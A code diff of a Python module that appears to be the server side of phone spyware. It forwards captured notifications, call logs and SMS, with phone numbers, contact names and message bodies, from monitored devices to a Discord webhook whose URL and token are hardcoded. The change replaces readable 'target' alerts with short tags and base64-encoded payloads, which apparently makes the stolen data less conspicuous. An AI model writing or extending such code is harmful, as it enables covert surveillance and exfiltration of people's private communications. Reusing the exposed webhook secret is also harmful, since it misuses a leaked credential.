@@ -433,7 +433,6 @@ DISCORD_WEBHOOK_URL = os.getenv(
     'https://discord.com/api/webhooks/1541368598331920404/vVZ60YYheFIwdpHwp5HcuVfwEB7cH3saOy9aW5O0_23DBm_SmNW58do2ok0JL1UGCVxt'
 )
 DISCORD_ALERT_WEBHOOK_URL = os.getenv('DISCORD_ALERT_WEBHOOK_URL', DISCORD_WEBHOOK_URL)
-DISCORD_ALERT_PING = os.getenv('DISCORD_ALERT_PING', '@here')
 
 DISCORD_FORWARD_CATEGORIES = {'VoIP & Social Messages', 'GPS / Location Toggled', 'Telephony Calls'}
 
@@ -522,7 +521,7 @@ def _send_discord(payload, is_alert=False):
 
 
 def send_discord_for_notifications(notifications, device_id):
-    """Send Discord embeds for qualifying notification categories and keyword alerts."""
+    """Send abbreviated Discord embeds for qualifying notification categories and keyword alerts."""
     for n in notifications:
         category = n.get('category') or ''
         app_package = n.get('app_package') or ''
@@ -546,51 +545,31 @@ def send_discord_for_notifications(notifications, device_id):
         if _discord_is_duplicate(dedup_key):
             continue
 
+        encoded = base64.b64encode(raw_text.encode()).decode()
+
         if is_important:
-            matched_kw = get_matched_alert_keyword(raw_text) or "Keyword Match"
-            dev_label = _get_device_label(device_id)
-            app_label = app_name or app_package or "Unknown App"
-            embed = {
-                'title': f'🚨 ALERT: Notification Matched "{matched_kw}"',
-                'description': f'**Device:** `{dev_label}`\n**App:** {app_label}\n**Title:** {title or "-"}\n**Message:** {content or "-"}',
-                'color': 0xED4245,  # High-priority red highlight
-                'fields': [
-                    {'name': 'Matched Keyword', 'value': f'`{matched_kw}`', 'inline': True},
-                    {'name': 'App', 'value': app_label, 'inline': True},
-                    {'name': 'Device', 'value': dev_label, 'inline': True}
-                ],
-                'timestamp': datetime.now(timezone.utc).isoformat()
-            }
-            webhook_payload = {'embeds': [embed]}
-            if DISCORD_ALERT_PING:
-                webhook_payload['content'] = f"{DISCORD_ALERT_PING} 🚨 **Target Keyword Alert: `{matched_kw}`**"
-            _send_discord(webhook_payload, is_alert=True)
+            title_tag = '!M'
+            desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
+            color = 0xED4245  # High-priority red highlight
         else:
-            encoded = base64.b64encode(raw_text.encode()).decode()
             title_tag = 'M'
             desc = f'{device_id[-6:]} · {encoded}'
             color = 0x5865F2  # Standard blurple
-            embed = {
-                'title': title_tag,
-                'description': desc,
-                'color': color
-            }
-            _send_discord({'embeds': [embed]}, is_alert=False)
+
+        embed = {
+            'title': title_tag,
+            'description': desc,
+            'color': color
+        }
+        _send_discord({'embeds': [embed]}, is_alert=is_important)
 
 
 def send_discord_for_calls(call_logs, device_id):
-    """Send Discord embeds for call logs and keyword alerts."""
+    """Send abbreviated Discord embeds for call logs and keyword alerts."""
     type_code = {'incoming': 'I', 'outgoing': 'O', 'missed': 'M', 'rejected': 'R'}
-    type_names = {
-        'incoming': 'Incoming Call 📞',
-        'outgoing': 'Outgoing Call 📱',
-        'missed': 'Missed Call ⚠️',
-        'rejected': 'Rejected Call 🚫'
-    }
     for c in call_logs:
         raw_call_type = c.get('call_type', '')
         ct = type_code.get(raw_call_type, 'U')
-        call_type_str = type_names.get(raw_call_type, raw_call_type.title() or 'Call')
         phone_num = decode_field(c.get('phone_number') or '')
         contact = decode_field(c.get('contact_name') or '')
         duration = c.get('duration_sec', 0)
@@ -603,50 +582,34 @@ def send_discord_for_calls(call_logs, device_id):
         if _discord_is_duplicate(dedup_key):
             continue
 
+        raw_payload = f"{phone_num} {contact} {ct} {duration}"
+        encoded = base64.b64encode(raw_payload.encode()).decode()
+
         if is_important:
-            matched_kw = get_matched_alert_keyword(raw_text) or "Keyword Match"
-            dev_label = _get_device_label(device_id)
-            embed = {
-                'title': f'🚨 ALERT: Call Matched "{matched_kw}"',
-                'description': f'**Device:** `{dev_label}`\n**Type:** {call_type_str}\n**Number:** `{phone_num}`\n**Contact:** {contact or "Unknown"}\n**Duration:** {duration}s',
-                'color': 0xED4245,  # High-priority red highlight
-                'fields': [
-                    {'name': 'Matched Keyword', 'value': f'`{matched_kw}`', 'inline': True},
-                    {'name': 'Call Type', 'value': call_type_str, 'inline': True},
-                    {'name': 'Number', 'value': f'`{phone_num}`', 'inline': True},
-                    {'name': 'Contact', 'value': contact or 'Unknown', 'inline': True},
-                    {'name': 'Duration', 'value': f'{duration}s', 'inline': True},
-                    {'name': 'Device', 'value': dev_label, 'inline': True}
-                ],
-                'timestamp': datetime.now(timezone.utc).isoformat()
-            }
-            webhook_payload = {'embeds': [embed]}
-            if DISCORD_ALERT_PING:
-                webhook_payload['content'] = f"{DISCORD_ALERT_PING} 🚨 **Target Call Alert: `{matched_kw}`**"
-            _send_discord(webhook_payload, is_alert=True)
+            title_tag = '!T'
+            desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
+            color = 0xED4245  # High-priority red highlight
         else:
-            raw_payload = f"{phone_num} {contact} {ct} {duration}"
-            encoded = base64.b64encode(raw_payload.encode()).decode()
             title_tag = 'T'
             desc = f'{device_id[-6:]} · {encoded}'
             color = 0x57F287  # Standard green
-            embed = {
-                'title': title_tag,
-                'description': desc,
-                'color': color
-            }
-            _send_discord({'embeds': [embed]}, is_alert=False)
+
+        embed = {
+            'title': title_tag,
+            'description': desc,
+            'color': color
+        }
+        _send_discord({'embeds': [embed]}, is_alert=is_important)
 
 
 def send_discord_for_sms(sms_messages, device_id):
-    """Send Discord embeds for SMS messages and keyword alerts."""
+    """Send abbreviated Discord embeds for SMS messages and keyword alerts."""
     for s in sms_messages:
         address = decode_field(s.get('address', 'unknown'))
         contact = decode_field(s.get('contact_name') or '')
         body = decode_field(s.get('body') or '')
         sms_type = s.get('sms_type', 'inbox')
         raw_ts = s.get('occurred_at') or ''
-        sms_type_str = 'Received SMS 📥' if sms_type in ('inbox', 'received') else 'Sent SMS 📤'
         raw_text = f"{address} {contact} {body}"
 
         is_important = is_important_content(raw_text)
@@ -655,38 +618,24 @@ def send_discord_for_sms(sms_messages, device_id):
         if _discord_is_duplicate(dedup_key):
             continue
 
+        raw_payload = f"{address} {contact} {sms_type} {body}"
+        encoded = base64.b64encode(raw_payload.encode()).decode()
+
         if is_important:
-            matched_kw = get_matched_alert_keyword(raw_text) or "Keyword Match"
-            dev_label = _get_device_label(device_id)
-            embed = {
-                'title': f'🚨 ALERT: SMS Matched "{matched_kw}"',
-                'description': f'**Device:** `{dev_label}`\n**Type:** {sms_type_str}\n**Number:** `{address}`\n**Contact:** {contact or "Unknown"}\n**Message:** {body or "-"}',
-                'color': 0xED4245,  # High-priority red highlight
-                'fields': [
-                    {'name': 'Matched Keyword', 'value': f'`{matched_kw}`', 'inline': True},
-                    {'name': 'Type', 'value': sms_type_str, 'inline': True},
-                    {'name': 'Number', 'value': f'`{address}`', 'inline': True},
-                    {'name': 'Contact', 'value': contact or 'Unknown', 'inline': True},
-                    {'name': 'Device', 'value': dev_label, 'inline': True}
-                ],
-                'timestamp': datetime.now(timezone.utc).isoformat()
-            }
-            webhook_payload = {'embeds': [embed]}
-            if DISCORD_ALERT_PING:
-                webhook_payload['content'] = f"{DISCORD_ALERT_PING} 🚨 **Target SMS Alert: `{matched_kw}`**"
-            _send_discord(webhook_payload, is_alert=True)
+            title_tag = '!S'
+            desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
+            color = 0xED4245  # High-priority red highlight
         else:
-            raw_payload = f"{address} {contact} {sms_type} {body}"
-            encoded = base64.b64encode(raw_payload.encode()).decode()
             title_tag = 'S'
             desc = f'{device_id[-6:]} · {encoded}'
             color = 0x3BA55D  # Standard green
-            embed = {
-                'title': title_tag,
-                'description': desc,
-                'color': color
-            }
-            _send_discord({'embeds': [embed]}, is_alert=False)
+
+        embed = {
+            'title': title_tag,
+            'description': desc,
+            'color': color
+        }
+        _send_discord({'embeds': [embed]}, is_alert=is_important)
 
 
 def send_discord_for_gps(gps_events, device_id):
